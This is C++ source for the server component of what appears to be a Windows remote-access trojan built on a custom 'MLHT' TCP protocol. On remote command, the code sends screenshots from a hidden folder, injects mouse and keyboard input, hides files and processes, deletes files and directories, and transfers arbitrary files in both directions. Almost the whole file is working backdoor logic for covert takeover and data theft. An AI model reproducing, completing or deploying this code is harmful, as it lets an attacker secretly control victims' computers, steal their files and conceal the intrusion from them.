#include "MLHT_SERVER.h"
#include "Op_Function.h"


MLHT_SERVER::MLHT_SERVER(int port){

	IDtt = 1;

	p_send = new MLHT();
	p_get = new MLHT();

	WSAStartup(MAKEWORD(2, 2), &wsaData);
	//本函数必须是应用程序或DLL调用的第一个Windows Sockets函数。
	//它允许应用程序或DLL指明Windows Sockets API的版本号及获得特定Windows Sockets实现的细节。
	//应用程序或DLL只能在一次成功的WSAStartup()调用之后才能调用进一步的Windows Sockets API函数

	s = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);			//初始化socket
	sockaddr.sin_family = PF_INET;							//sin_family指代协议族，在socket编程中只能是PF_INET

	sockaddr.sin_addr.S_un.S_addr = inet_addr("0.0.0.0");   //绑定本地IP地址
	server_port = port;
	sockaddr.sin_port = htons(server_port);					//设置服务器监听的端口

	bind(s, (SOCKADDR*)&sockaddr, sizeof(SOCKADDR));		//进行绑定动作
	listen(s, 1);											//启动监听
}


//等待客户端连接
void MLHT_SERVER::WaitForClient(){
	int size = sizeof(SOCKADDR);
	clientsocket = accept(s, &clientAddr, &size);               //阻塞，直到有新tcp客户端连接
}


//等待返回报文，检测返回报文是否合法
int MLHT_SERVER::WaitReturnPacket(){
	
	ZeroMemory(buffer, sizeof(buffer));

	if(recv(clientsocket, buffer, SOCKET_BUFFER_SIZE, NULL) != SOCKET_ERROR){
		if(p_get->PacketAccept(((BYTE*)buffer)))
			return PACKET_ACCEPT_SUCCESS;
		else
			return PACKET_ACCEPT_FAIL;
	}
	
	return SOCKET_ERROR;
}


//等待ACK返回报文
int MLHT_SERVER::WaitForAckPacket(){

	int ret = WaitReturnPacket();
	if(ret != PACKET_ACCEPT_SUCCESS)
		return ret;

	if(IsAckPacket())
		return GET_ACK;
	else
		return NOT_GET_ACK;

}


//发无参数报文
void MLHT_SERVER::SendPacket(WORD mtu_type){

	ZeroMemory(buffer, sizeof(buffer));

	p_send = new MLHT(IDtt++,mtu_type);
	p_send->PacketSplice((BYTE*)buffer);
	send(clientsocket,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//发送报文

}


//发带参数报文
void MLHT_SERVER::SendPacket(WORD mtu_type,WORD slicenum,WORD slicesum,char* content,WORD contentlength){
		
	ZeroMemory(buffer, sizeof(buffer));

	p_send = new MLHT(IDtt++,mtu_type,slicenum,slicesum,(BYTE*)content,contentlength);
	p_send->PacketSplice((BYTE*)buffer);
	send(clientsocket,buffer,p_send->GetPacketLength()+sizeof(BYTE),NULL);//发送报文

}


//发ACK返回报文
void MLHT_SERVER::SendACKPacket(){
	SendPacket(MLHT_MTU_TYPE_ACK | p_get->GetPacketType());
}


//发FIN返回报文
void MLHT_SERVER::SendFINPacket(){
	SendPacket(MLHT_MTU_TYPE_FIN);
}


bool MLHT_SERVER::IsAckPacket(){
	return p_get->PacketAnalyze_SYNACKFIN() == MLHT_MTU_TYPE_ACK;
}


bool MLHT_SERVER::IsFinPacket(){
	return p_get->PacketAnalyze_SYNACKFIN() == MLHT_MTU_TYPE_FIN;
}


bool MLHT_SERVER::IsReturnPacket(){
	return p_get->PacketAnalyze_FILE() == p_send->PacketAnalyze_FILE();
}


//传输文件包
int MLHT_SERVER::SendFilePacket(
	WORD mtu_type,			//文件操作协议类型
	FILE *fp,				//文件指针
	int contentlen			//文件长度
	)
{
	int ret;
	
	//计算总分片数
	WORD slice_sum = contentlen/MLHT_SLICE_FILE_LENGTH;
	if(contentlen % MLHT_SLICE_FILE_LENGTH)
		slice_sum++;
	
	char p[MLHT_SLICE_FILE_LENGTH]={0};		//文件指针
	int packetlen = MLHT_SLICE_FILE_LENGTH;	//分片长度

	//分片1->n: 向客户端/服务器发送文件分片
	for(WORD slice_num = 1;slice_num <= slice_sum;slice_num++){
		
		if(slice_num == slice_sum)									// 设置末尾分片长度
			packetlen = contentlen%MLHT_SLICE_FILE_LENGTH;

		fseek(fp,MLHT_SLICE_FILE_LENGTH*(slice_num-1),SEEK_SET);	// 顺序定位文件指针
		fread(p,packetlen,1,fp);									// 丛文件指针开始读

		SendPacket(mtu_type,slice_num,slice_sum,p,packetlen);		// 发送文件报文

		//判断是否返回ACK包
		ret = WaitForAckPacket();
		if(ret != GET_ACK)
			return OP_FAIL;
	}

	return OP_SUCCESS;

}



//接收文件包
int MLHT_SERVER::GetFilePacket(
	FILE *fp				//保存目标文件的指针
	)
{
	int ret;

	do{
		ret = WaitReturnPacket();
		if(ret != PACKET_ACCEPT_SUCCESS)
			return ret;

		if(IsReturnPacket()){
			if(fwrite(p_get->GetPacketContent(),
				p_get->GetPacketLength()-MLHT_HEADER_LENGTH,
				1,
				fp)!= 1){
					SendFINPacket();
					return FILE_WRITE_FAIL;
			}
			else
				SendACKPacket();
		}
		else if(IsFinPacket()){
			return OP_FAIL;
		}
	}while(!p_get->IsLastPacket());
	
	return OP_SUCCESS;
}


///RC OPERATR
int MLHT_SERVER::GetScreenshoot(){
		
	char Screenshootdir[MAX_PATH] = "c:\\hideme\\screen.bmp";

	printf("ScreenShoot over,sending packet:\n");

	//SceenShoot();
	
	//检查下载文件目录是否合法
	FILE *fp = fopen(Screenshootdir,"rb");

	if(fp == NULL){
		fclose(fp);
		SendFINPacket();
		return FILE_READ_FAIL;
	}
		
	//计算文件大小是否过大
	fseek(fp,0L,SEEK_END);			// 定位到文件末尾
	int contentlen = ftell(fp);		// 返回指针偏离文件头的位置(即文件中字符个数)
	if(contentlen > MLHT_SLICE_FILE_LENGTH){
		fclose(fp);
		SendFINPacket();
		return FILE_TOO_LARGE;
	}
	else
		SendACKPacket();

	int ret = SendFilePacket(MLHT_MTU_TYPE_RC_SCREEN,fp,contentlen);
	fclose(fp);
	return ret;

}


void MLHT_SERVER::GetMouseOperate(){

	BYTE* z = p_get->GetPacketContent();
	int x =z[0]*BYTE_SIZE+z[1];
	int y =z[2]*BYTE_SIZE+z[3];

	mouse_op(x,y);

}


void MLHT_SERVER::GetKeybroadOperate(){
		
	BYTE* z = p_get->GetPacketContent();
	int x =z[0]*BYTE_SIZE+z[1];

	keybd_op(x);
}


//File Operate
void MLHT_SERVER::GetFileHide(){
	hide_file();
	SendACKPacket();
}


void MLHT_SERVER::GetFileShow(){
	show_file();
	SendACKPacket();
}


//Process Operate
void MLHT_SERVER::GetProcessHide(){
	hide_process();
	SendACKPacket();
}


void MLHT_SERVER::GetProcessShow(){
	show_process();
	SendACKPacket();
}


//Shell Operate
bool MLHT_SERVER::GetShellLs(){
	char str[MLHT_SLICE_FILE_LENGTH] = {0};
	if(ListDir((char *)p_get->GetPacketContent(),str)){
		SendPacket(MLHT_MTU_TYPE_SHELL_LS,1,1,str,strlen(str)+1);
		return true;
	}
	else{
		SendFINPacket();
		return false;
	}
}

		
bool MLHT_SERVER::GetShellMkdir(){
	if(CrtDir((char *)p_get->GetPacketContent())){
		SendACKPacket();
		return true;
	}
	else{
		SendFINPacket();
		return false;
	}
}

		
bool MLHT_SERVER::GetShellRmdir(){
	if(DltDir((char *)p_get->GetPacketContent())){
		SendACKPacket();
		return true;
	}
	else{
		SendFINPacket();
		return false;
	}
}


bool MLHT_SERVER::GetShellRm(){
	if(deletfile((char *)p_get->GetPacketContent())){
		SendACKPacket();
		return true;
	}
	else{
		SendFINPacket();
		return false;
	}
}

		
//接收上传文件
int MLHT_SERVER::GetUploadFile(){
	char uploadFiledir[MAX_PATH];
	memcpy(uploadFiledir,p_get->GetPacketContent(),p_get->GetPacketLength()-MLHT_HEADER_LENGTH);
	
	//检测本地目录是否合法
	FILE* fp = fopen(uploadFiledir,"ab");
	if(fp == NULL){
		fclose(fp);
		SendFINPacket();
		return FILE_OPEN_FAIL;
	}
	else
		SendACKPacket();

	printf("Upload file path: %s\n",uploadFiledir);

	int ret = GetFilePacket(fp);
	fclose(fp);
	return ret;
}


//发送下载文件
int MLHT_SERVER::SendDownloadFile(){
	char downloadFilename[MAX_PATH];
	memcpy(downloadFilename,p_get->GetPacketContent(),p_get->GetPacketLength()-MLHT_HEADER_LENGTH);

	//检查下载文件目录是否合法
	FILE *fp = fopen(downloadFilename,"rb");

	if(fp == NULL){
		fclose(fp);
		SendFINPacket();
		return FILE_READ_FAIL;
	}
		
	//计算文件大小是否过大
	fseek(fp,0L,SEEK_END);			// 定位到文件末尾
	int contentlen = ftell(fp);		// 返回指针偏离文件头的位置(即文件中字符个数)
	if(contentlen > MAX_FILE_SIZE){
		fclose(fp);
		SendFINPacket();
		return FILE_TOO_LARGE;
	}
	else
		SendACKPacket();

	printf("Download file path: %s\n",downloadFilename);
	
	int ret = SendFilePacket(MLHT_MTU_TYPE_SHELL_DOWNLOAD,fp,contentlen);
	fclose(fp);
	return ret;
}